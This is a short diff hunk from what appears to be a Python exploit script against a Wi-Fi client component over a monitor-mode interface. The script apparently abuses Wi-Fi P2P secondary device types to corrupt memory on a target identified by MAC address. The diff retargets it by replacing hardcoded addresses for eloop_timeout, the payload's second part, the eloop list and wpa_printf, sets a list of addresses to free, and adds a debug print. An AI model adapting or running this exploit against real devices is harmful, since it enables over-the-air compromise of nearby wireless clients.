@@ -21,15 +21,16 @@ iface = args.interface        # interface in monitor mode
 target = args.target          # target MAC address
 
 base  = 0x2a000000            # base address of main module
-eloop = 0xb6919420            # eloop_timeout address
-p2    = 0xb69202e0            # second part of payload
+eloop = 0x511638              # eloop_timeout address
+p2    = 0x5842c0           # second part of payload
 
-eloop_next = base + 0x12b670  # eloop next (&list terminates)
-wpa_printf = base + 0xf391    # addr of wpa_printf
+eloop_next = 0x510914    # eloop next (&list terminates)
+wpa_printf = 0x40e9fc    # addr of wpa_printf
 
 msg = b"hi!"                  # log on success (< 4 bytes)
 frees = [eloop-0x10]          # list of addrs to free (up to 10)
 sec_devs = 0x11+len(frees)    # number of secondary device types
+print(sec_devs)
 
 p32 = lambda x: struct.pack("<I", x)
 
